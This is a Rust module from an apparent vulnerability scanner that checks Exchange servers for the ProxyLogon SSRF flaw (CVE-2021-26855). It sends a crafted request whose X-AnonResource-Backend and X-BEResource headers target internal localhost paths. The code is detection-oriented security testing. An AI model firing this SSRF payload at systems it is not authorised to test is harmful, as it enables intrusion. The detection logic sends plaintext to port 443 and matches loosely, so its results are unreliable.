// CVE-2021-26855 — Microsoft Exchange ProxyLogon SSRF.
// Sends a crafted SSRF request to /owa/auth/x.js with X-AnonResource-Backend header.
// A vulnerable server processes the request and leaks an internal path.

use crate::engine::{Checker, VulnResult, VulnSeverity};
use async_trait::async_trait;
use std::net::IpAddr;

pub struct ProxyLogon;

#[async_trait]
impl Checker for ProxyLogon {
    fn name(&self) -> &'static str {
        "proxylogon"
    }

    fn ports(&self) -> &'static [u16] {
        &[443, 80]
    }

    async fn check(&self, ip: IpAddr, port: u16) -> VulnResult {
        let scheme = if port == 443 { "https" } else { "http" };
        let addr = format!("{scheme}://{ip}:{port}");

        // Send SSRF probe — vulnerable Exchange echoes the backend path
        let req = format!(
            "GET /owa/auth/x.js HTTP/1.1\r\n\
             Host: {ip}\r\n\
             X-AnonResource-Backend: localhost/ecp/default.flt?~3\r\n\
             X-BEResource: localhost/owa/auth/logon.aspx?~3\r\n\
             Connection: close\r\n\r\n"
        );

        let result = tokio::time::timeout(
            std::time::Duration::from_millis(3000),
            send_raw(ip, port, req.as_bytes()),
        )
        .await;

        match result {
            Ok(Ok(resp)) => {
                let text = String::from_utf8_lossy(&resp);
                if text.contains("X-CalculatedBETarget")
                    || text.contains("X-FEServer")
                    || text.contains("X-BEServer")
                    || text.contains("Microsoft") && text.contains("200")
                {
                    VulnResult::vuln(
                        "proxylogon",
                        VulnSeverity::Critical,
                        format!("Exchange SSRF response at {addr} — likely CVE-2021-26855"),
                    )
                    .with_cve("CVE-2021-26855")
                } else {
                    VulnResult::safe("proxylogon")
                }
            }
            _ => VulnResult::safe("proxylogon"),
        }
    }
}

async fn send_raw(ip: IpAddr, port: u16, data: &[u8]) -> std::io::Result<Vec<u8>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpStream;

    let mut stream = TcpStream::connect((ip, port)).await?;
    stream.write_all(data).await?;
    let mut buf = vec![0u8; 4096];
    let n = stream.read(&mut buf).await?;
    buf.truncate(n);
    Ok(buf)
}
